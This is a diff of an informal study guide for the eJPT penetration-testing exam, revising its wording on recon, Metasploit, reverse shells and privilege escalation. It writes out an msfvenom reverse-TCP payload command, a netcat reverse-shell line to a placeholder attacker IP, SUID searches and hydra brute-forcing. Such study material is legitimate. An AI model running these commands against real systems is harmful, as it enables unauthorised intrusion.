@@ -25,28 +25,28 @@ But here’s the truth: **if you can’t move around Linux in terminal, stop. Go
 
 #### **Nmap? Yeah, but not just “nmap (ip)”**
 You gotta go deeper.  
-`nmap -sV -sC -p- --open` — that’s your bread and butter.  
-Find services, versions, scripts. Look for low-hanging fruit.
+`nmap -sV -sC -p- --open` that’s your bread and butter.  
+Find services, versions, use scripts. Look for low-hanging fruit.
 
 And **man pages**? Don’t sleep on ‘em.  
-If you blank on a command — `man nmap`, `nmap --help`. Boom. Answers.
+If you blank on a command `man (command)`, `(command) --help`. Boom. Answers.
 
 #### **Metasploit = Your Best Friend**
 You *will* use it. Learn the flow:
 - `searchsploit [service]` → find an exploit
 - `msfconsole` → `use exploit/...` → `set RHOSTS` → `set LHOST` → `exploit`
-- Get a shell? Congrats. Now **don’t trip** — `sysinfo`, `getuid`, see what you’re working with.
+- Get a shell? Congrats. Now **don’t trip** `sysinfo`, `getuid`, see what you’re working with.
 
 And **msfvenom**? For payloads.  
 `msfvenom -p windows/meterpreter/reverse_tcp LHOST=your_ip LPORT=4444 -f exe > shell.exe`  
 Then serve it, get that callback.
 
 #### **Netcat & Reverse Shells**
-You’ll see “pop a shell” and panic. Don’t.
+There are times when you need to pop a shell but dont panic.
 
 Reverse shell = you send a payload, target connects *back* to you.  
-You run: `nc -lvnp 4444`  
-They call: `nc YOUR_IP 4444 -e /bin/bash` (Linux)  
+You run: `nc -lvnp 4444` (which listens on port 4444)  
+They call: `nc YOUR_IP 4444 -e /bin/bash` (Linux)  (they connect back to your open port)
 Or use [revshells.com](https://www.revshells.com) — cheat code for noobs (and pros who forget).
 
 ---
@@ -57,7 +57,7 @@ Once you’re in, you’re probably not root. So **escalate**.
 
 - `find / -type f -perm -04000 2>/dev/null` → find SUID bins
 - Use **GTFOBins** ([gtfobins.github.io](https://gtfobins.github.io)) — it’s *magic*. Type the binary, get escalation tricks.
-- Upload **LinPEAS** with `wget` or `scp` — let it do the work for you.
+- Upload **LinPEAS** with `wget` or `scp` let it do the work for you.
 
 ---
 
@@ -76,19 +76,19 @@ They *will* throw you a **Windows IIS box**. Probably running some old ASP or PH
 
 - **It’s open book. Use it.** Google, notes, Hackersploit, INE — all fair game.
 - **Enumerate like a maniac.** Run scans, save output, check everything twice.
-- **Don’t brute-force blindly.** Use `hydra` smart — right service, right wordlist (`rockyou.txt`).
+- **Don’t brute-force blindly.** Use `hydra` smart right service, right wordlist (`rockyou.txt`).
 - **Pivot.** Get in one box? Scan the internal net. Use `arp-scan`, `nmap`, see what else is alive.
 - **Take breaks.** I did mine over two days. Brain gets tired. Step away, come back fresh.
-
+- **Pace yourself** Go to fast and you may miss something, be thorough.
 ---
 
 ### Final Thoughts
 
-The eJPT? It’s not about being a genius. It’s about **process**.  
+The eJPT? It’s about **Attentiveness**, **Patience**, and the **Process**.  
 Recon → Scan → Exploit → Escalate → Pivot → Repeat.
 
-If you know the tools, stay calm, and don’t overthink it — you’ll pass.
+If you know the tools, stay calm, and don’t overthink it, you’ll pass.
 
 And yeah… I should’ve made a write-up. But now you got this.  
-Go get that cert. Drop a like. Stay sharp. ✌️
+Go get that cert. Stay sharp. 
 
